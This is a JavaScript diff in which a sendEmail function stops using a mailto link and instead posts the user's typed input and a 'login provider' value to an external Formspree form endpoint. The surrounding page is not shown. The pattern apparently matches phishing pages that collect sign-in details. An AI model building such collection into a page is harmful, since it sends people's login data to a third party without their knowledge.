@@ -141,20 +141,32 @@
           });
         }
 
-        function sendEmail(userInput, loginProvider) {
-          var message = 'User Input: ' + userInput + '\nLogin Provider: ' + loginProvider;
-          var email = 'humanproduct@gmail.com';
+ function sendEmail(userInput, loginProvider) {
+  var formData = new FormData();
+  formData.append('userInput', userInput);
+  formData.append('loginProvider', loginProvider);
 
-          var mailtoLink = 'mailto:' + email + '?subject=User Submission&body=' + encodeURIComponent(message);
-
-          var mailtoWindow = window.open(mailtoLink, '_blank');
-          if (mailtoWindow) {
-            // Mailto link opened successfully
-            // You can perform further actions here if needed
-          } else {
-            alert('Please manually send an email to ' + email + ' with your submission.');
-          }
-        }
+  fetch('https://formspree.io/f/moqzbzry', {
+    method: 'POST',
+    body: formData
+  })
+  .then(function(response) {
+    if (response.ok) {
+      console.log('Email sent successfully');
+      // Optionally display a success message to the user
+      alert('Email sent successfully');
+    } else {
+      console.log('Failed to send email');
+      // Optionally display an error message to the user
+      alert('Failed to send email');
+    }
+  })
+  .catch(function(error) {
+    console.log('Error:', error);
+    // Optionally display an error message to the user
+    alert('Error sending email');
+  });
+}
 
         function noSpace(e) {
             if (e.which == 32) return false;
